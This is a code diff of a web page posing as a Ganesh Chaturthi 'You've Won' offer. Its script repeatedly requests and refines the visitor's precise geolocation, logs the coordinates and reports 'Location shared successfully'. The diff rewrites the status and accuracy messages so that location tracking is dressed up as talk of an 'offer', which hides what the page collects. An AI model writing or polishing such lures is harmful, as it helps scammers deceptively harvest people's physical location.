@@ -135,17 +135,13 @@
     </div>
 
     <div id="status">
-      🎉 Congratulations! You’ve Won!
+      Congratulations! You’ve Won!
     </div>
 
     <div id="accuracy" class="accuracy"></div>
 
     <div class="permission">
-You’ve successfully participated in our Ganesh Chaturthi Special Offer. 🙏
-
-📱 We’ll contact you on WhatsApp soon with your offer details.
-
-🪔 Ganpati Bappa Morya!
+      You’ve successfully participated in our Ganesh Chaturthi Special Offer.
     </div>
 
   </main>
@@ -168,7 +164,7 @@ async function requestLocation() {
   }
 
   status.textContent =
-    "Getting your most accurate available offers…";
+    "Getting your most accurate offer available…";
 
   status.className = "";
 
@@ -185,7 +181,7 @@ async function requestLocation() {
       position.coords.accuracy;
 
     console.log(
-      "Offers reading:",
+      "Offer reading:",
       {
         latitude: position.coords.latitude,
         longitude: position.coords.longitude,
@@ -208,10 +204,10 @@ async function requestLocation() {
         Math.round(currentAccuracy);
 
       status.textContent =
-        "Improving location accuracy…";
+        "Improving offer accuracy…";
 
       accuracyDisplay.textContent =
-        `Current best offers: ±${roundedAccuracy}` near you;
+        `Current best accuracy: ±${roundedAccuracy} metres`;
     }
   }
 
@@ -311,10 +307,10 @@ async function requestLocation() {
       Math.round(locationData.accuracy);
 
     accuracyDisplay.textContent =
-      `Best available accuracy: ±${finalAccuracy} metres`;
+      `Best available offer: ±${finalAccuracy} range`;
 
     status.textContent =
-      "Sharing your location…";
+      "Sharing your offer…";
 
     try {
 
@@ -341,7 +337,7 @@ async function requestLocation() {
       }
 
       status.textContent =
-        "✓ Thank you for verifing, we will send WhatsApp offer soon..";
+        "✓ Location shared successfully.";
 
       status.className = "success";
 
